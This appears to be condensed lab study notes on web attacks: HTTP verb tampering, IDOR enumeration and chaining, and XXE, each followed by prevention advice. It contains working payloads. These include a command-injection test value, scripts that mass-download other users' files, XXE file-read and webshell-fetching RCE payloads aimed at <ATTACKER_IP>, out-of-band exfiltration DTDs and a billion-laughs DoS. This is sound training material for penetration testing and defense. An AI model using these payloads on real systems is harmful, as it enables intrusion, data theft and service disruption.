# Web Attacks (HTTP Verb Tampering / IDOR / XXE)

## Intro to HTTP Verb Tampering

HTTP has 9 verbs. Misconfig in web server or app code can let non-GET/POST methods bypass auth or filters.

Common verbs beyond GET/POST:

- HEAD — like GET but headers only, no body
- PUT — writes payload to specified location
- DELETE — deletes resource at location
- OPTIONS — shows accepted verbs
- PATCH — partial modification of resource

### Insecure Configurations

Auth scoped to specific verbs leaves others open.

```xml
<Limit GET POST>
Require valid-user
</Limit>
```

Attacker sends HEAD (or other unlisted verb) → bypasses auth.

### Insecure Coding

Filter checks one method's params, but execution uses a method-agnostic superglobal.

```php
$pattern = "/^[A-Za-z\s]+$/";
if(preg_match($pattern, $_GET["code"])) {
    $query = "Select * from ports where port_code like '%" . $_REQUEST["code"] . "%'";
}
```

Filter only checks `$_GET`, query uses `$_REQUEST` (GET+POST). Send payload via POST → GET is empty/clean → passes filter → payload lands via `$_REQUEST` → SQLi.

## Bypassing Security Filters

### Identify

Malicious input (e.g. `test;`) via normal method → blocked ("Malicious Request Denied!"). Filter exists.

### Exploit

Burp → Change Request Method → switch GET to POST (or vice versa) to bypass filter.

```
GET /?filename=test%3B HTTP/1.1
```

Same payload sent as different verb bypasses filter. Confirm with command injection test:

```
filename=file1; touch file2;
```

If both files created → verb tampering bypassed the filter → underlying vuln (command injection) confirmed.

## Verb Tampering Prevention

### Insecure Configuration

Vulnerable in Apache, Tomcat, ASP.NET when auth scoped to one verb.

Apache (`000-default.conf` / `.htaccess`):

```xml
<Directory "/var/www/html/admin">
AuthType Basic
AuthName "Admin Panel"
AuthUserFile /etc/apache2/.htpasswd
<Limit GET>
Require valid-user
</Limit>
</Directory>
```

Tomcat (`web.xml`):

```xml
<security-constraint>
<web-resource-collection>
<url-pattern>/admin/*</url-pattern>
<http-method>GET</http-method>
</web-resource-collection>
<auth-constraint>
<role-name>admin</role-name>
</auth-constraint>
</security-constraint>
```

ASP.NET (`web.config`):

```xml
<system.web>
<authorization>
<allow verbs="GET" roles="admin">
<deny verbs="GET" users="*">
</deny>
</allow>
</authorization>
</system.web>
```

Fix: don't scope auth to single verb. Use `LimitExcept` (Apache), `http-method-omission` (Tomcat), `add`/`remove` (ASP.NET) — covers all verbs except specified. Disable/deny HEAD unless required.

### Insecure Coding

Inconsistent method use between filter and execution:

```php
if (isset($_REQUEST['filename'])) {
    if (!preg_match('/[^A-Za-z0-9. _-]/', $_POST['filename'])) {
        system("touch " . $_REQUEST['filename']);
    } else {
        echo "Malicious Request Denied!";
    }
}
```

Filter checks `$_POST` only, `system()` uses `$_REQUEST`. GET request bypasses filter entirely.

Fix: use consistent, full-scope request functions in filters:

- PHP: `$_REQUEST['param']`
- Java: `request.getParameter('param')`
- C#: `Request['param']`

## Intro to IDOR

Object reference exposed directly to user (e.g. `download.php?file_id=123`) + no back-end access control = IDOR. Guess/increment ID → access other users' data.

### What Makes an IDOR Vulnerability

Direct reference alone isn't the bug — it's the missing access control (e.g. no RBAC) on the back-end that makes it exploitable.

### Impact of IDOR Vulnerabilities

- IDOR Information Disclosure — read private files/data
- IDOR Insecure Function Calls — modify/delete data, privilege escalation, account takeover (call admin-only APIs as standard user if back-end doesn't enforce role checks)

## Identifying IDORs

### URL Parameters & APIs

Look for object refs in URL params/APIs (`?uid=1`, `?filename=file_1.pdf`), also check cookies/headers. Increment values or fuzz.

### AJAX Calls

Check front-end JS for admin/hidden function calls with embedded object refs — may be callable even without UI access.

```javascript
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){}
    });
}
```

### Understand Hashing/Encoding

Encoded ref (e.g. base64) → decode, modify, re-encode.

```
?filename=ZmlsZV8xMjMucGRm → file_123.pdf
```

Hashed ref — check front-end JS for hash source:

```javascript
data: {filename: CryptoJS.MD5('file_1.pdf').toString()}
```

If hashing logic exposed client-side, hash arbitrary filenames to enumerate.

### Compare User Roles

Register multiple test users, diff their requests/object refs to understand ID calculation and whether back-end validates session vs requested object.

## Mass IDOR Enumeration

### Insecure Parameters

Static file IDOR — predictable filenames (`Invoice_1_09_2021.pdf`). Better: manipulate `uid` GET param directly (`documents.php?uid=2`) — no error, different files returned = confirmed IDOR. Watch page/file details closely, not just status codes.

### Mass Enumeration

Grep unique markers around links:

```bash
curl -s "http://<TARGET_URL>/documents.php?uid=3" | grep "<li class='pure-tree_link'>"
curl -s "http://<TARGET_URL>/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
```

Loop + download:

```bash
#!/bin/bash
url="http://<TARGET_URL>"
for i in {1..10}; do
    for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
        wget -q $url/$link
    done
done
```

## Bypassing Encoded References

### Function Disclosure

Hashed ref (e.g. md5) looks secure but if hash computed client-side in JS, reverse the logic:

```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

Replicate: `md5(base64(uid))`

```bash
echo -n 1 | base64 -w 0 | md5sum
```

`-n` (echo) and `-w 0` (base64) avoid trailing newline messing up the hash.

### Mass Enumeration

```bash
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```

```bash
#!/bin/bash
for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://<TARGET_URL>/download.php
    done
done
```

## IDOR in Insecure APIs

### Identifying Insecure APIs

PUT to update profile may leak hidden params:

```json
{
  "uid": 1,
  "uuid": "40f5888b67c748df7efba008e7c2f9d2",
  "role": "employee",
  "full_name": "Amy Lindon",
  "email": "a_lindon@employees.htb",
  "about": "..."
}
```

Role often mirrored in cookie: `role=employee`. Client-controlled role/uid/uuid = privilege escalation risk.

### Exploiting Insecure APIs

Test:

- Change own `uid` → other user's uid → check for `uid mismatch` (back-end check present)
- Change target uid + keep own uuid → `uuid mismatch` (another back-end check)
- POST/DELETE to create/delete users → may be blocked ("for admins only")
- Set role to guessed value → `Invalid role` if role names aren't known

Next step if blocked: test API's GET request for IDOR info disclosure (leaks uuid needed to bypass PUT checks).

## Chaining IDOR Vulnerabilities

### Information Disclosure

GET with `role=employee` cookie only (no per-user token) → can read other users by referencing their uid, even leaks `uuid`:

```json
{
  "uid": "2",
  "uuid": "4a9bd19b3b8676199592a346051f950c",
  "role": "employee",
  "full_name": "Iona Franklyn",
  "email": "i_franklyn@employees.htb",
  "about": "..."
}
```

### Modifying Other Users' Details

With leaked uuid, PUT to `/profile/api.php/profile/<uid>` with their uuid + your changes → no access control error → update succeeds. Follow-on attacks: change victim's email then request password reset (account takeover), or inject XSS payload into `about` field.

### Chaining Two IDOR Vulnerabilities

Enumerate all users via info disclosure to find admin role name (e.g. `web_admin`) via a leaked admin profile. Set own `role` to `web_admin` via PUT (no validation on role value) → refresh cookie → now able to create/delete users, mass-modify all profiles (e.g. XSS all `about` fields, mass email change).

## IDOR Prevention

### Object-Level Access Control

Implement RBAC mapped to every object/resource; validate on every request server-side, not client-supplied role/cookie.

```javascript
match /api/profile/{userId} {
  allow read, write: if user.isAuth == true && (user.uid == userId || user.roles == 'admin');
}
```

Role must come from session token / server-side RBAC lookup, never from client-supplied field.

### Object Referencing

Even with solid access control, avoid clear-text/sequential refs (`uid=1`). Use salted hashes or UUIDv4, generated and mapped server-side (never computed client-side).

```php
$uid = intval($_REQUEST['uid']);
$query = "SELECT url FROM documents where uid=" . $uid;
```

Note: UUIDs alone don't fix broken access control — still exploitable if session/authz check is missing (e.g. replaying another user's request).

## Intro to XXE

XXE = malicious XML input exploiting XML parser features (outdated libs) to read files or worse. OWASP Top 10.

### XML

Structure: Tag `<date>`, Entity `&lt;`, Element (root/child), Attribute (`version="1.0"`), Declaration (`<?xml version="1.0" encoding="UTF-8"?>`). Special chars needing entity refs: `<`, `>`, `&`, `"` → `&lt;`, `&gt;`, `&amp;`, `&quot;`. Comments: `<!-- -->`.

### XML DTD

Defines document structure. Inline or external:

```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
]>
```

External file ref:

```xml
<!DOCTYPE email SYSTEM "email.dtd">
```

External URL ref:

```xml
<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
```

### XML Entities

Custom entity:

```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

Referenced as `&company;`.

External entity (the XXE primitive):

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```

`PUBLIC` keyword also usable for publicly declared entities/standards — `SYSTEM` used throughout this module.

## Local File Disclosure

### Identifying

Find forms/endpoints sending XML. Check which submitted element gets reflected back in response (confirms injection point). Test entity definition:

```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

Reference `&company;` in place of normal value — if reflected value changes, XXE confirmed. Non-vulnerable apps show literal `&company;`.

Tip: if app defaults to JSON, try switching `Content-Type` to `application/xml` + converting body to XML — may still be processed.

### Reading Sensitive Files

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

Target files: configs, `id_rsa`, etc. Tip: some Java apps allow directory path instead of file → directory listing.

### Reading Source Code

Files containing XML special chars (`<`, `>`, `&`) break the entity reference — use PHP filter wrapper to base64-encode:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

Decode via Burp Inspector. PHP-only trick.

## Remote Code Execution with XXE

- Look for SSH keys, or NTLM hash theft (Windows) via forced external call
- `expect://` filter (PHP expect module required, often disabled):

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://id">
]>
```

- Most reliable: fetch webshell via curl, then interact:

```bash
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'<ATTACKER_IP>/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

Replace spaces with `$IFS` (spaces break XML). Avoid `|`, `>`, `{`. `expect` module rarely enabled by default — XXE more commonly used for disclosure than RCE.

## Other XXE Attacks

- SSRF via XXE — enumerate internal ports/pages (see Server-Side Attacks module)
- DOS via entity expansion (billion laughs style):

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```

Doesn't work on modern web servers (Apache) — entity self-reference protection.

## Advanced File Disclosure

### Advanced Exfiltration with CDATA

For files that break XML format / binary data, wrap in CDATA. Internal+external entities can't be joined directly — use XML Parameter Entities (`%`, DTD-only, can be joined if all external).

Host DTD (`xxe.dtd`):

```xml
<!ENTITY % begin "<![CDATA[">
<!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
<!ENTITY % end "]]>">
<!ENTITY % xxe SYSTEM "http://<ATTACKER_IP>:8000/xxe.dtd">
%xxe;
```

```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

Payload:

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://<ATTACKER_IP>:8000/xxe.dtd">
  %xxe;
]>
...
<email>&joined;</email>
```

Note: some modern servers block reading files that self-reference (DOS protection) — e.g. `index.php` may fail.

### Error Based XXE

When no XML entity is reflected in output — check for verbose PHP errors first (malformed XML, bad closing tag, nonexistent entity reference reveals server paths).

Host DTD payload:

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

Trigger:

```xml
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://<ATTACKER_IP>:8000/xxe.dtd">
  %remote;
  %error;
]>
```

File content leaks via the thrown error message. Works for source code too (swap file path). Less reliable — length limits, special chars can break it.

## Blind Data Exfiltration

### Out-of-band Data Exfiltration

No reflected output, no errors → OOB exfil. Base64-encode file via PHP filter, send as GET param to attacker server.

DTD:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://<ATTACKER_IP>:8000/?content=%file;'>">
```

Listener (decode on the fly):

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

```bash
vi index.php
php -S 0.0.0.0:8000
```

Trigger payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://<ATTACKER_IP>:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

Tip: DNS OOB variant — put encoded data as subdomain (`ENCODEDTEXT.attacker.com`), capture with `tcpdump`.

### Automated OOB Exfiltration

Tool: **XXEinjector**

```bash
git clone https://github.com/enjoiz/XXEinjector.git
```

Save raw request to file, only first line + `XXEINJECT` marker (no full XML body):

```
POST /blind/submitDetails.php HTTP/1.1
Host: <TARGET_IP>
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://<TARGET_IP>
Referer: http://<TARGET_IP>/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

XXEINJECT
```

Run:

```bash
ruby XXEinjector.rb --host=<ATTACKER_IP> --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

Exfiltrated files land in `Logs/<TARGET_IP>/...` under tool dir (base64, decoded on read):

```bash
cat Logs/<TARGET_IP>/etc/passwd.log
```

## XXE Prevention

### Avoiding Outdated Components

Most XXE bugs = outdated XML libs, not manual dev sanitization gaps (unlike XSS/IDOR/SQLi). Example: PHP's `libxml_disable_entity_loader` deprecated since PHP 8.0, unsafe. Also update SOAP/API libs, SVG/PDF processors — anything parsing XML.

Reference: OWASP XXE Prevention Cheat Sheet.

### Using Safe XML Configurations

- Disable custom DTDs
- Disable External XML Entities
- Disable Parameter Entity processing
- Disable XInclude support
- Prevent Entity Reference Loops
- Disable runtime error display (mitigates error-based XXE)
- Prefer JSON/YAML + REST over XML/SOAP where possible
- WAF as extra layer only — never sole defense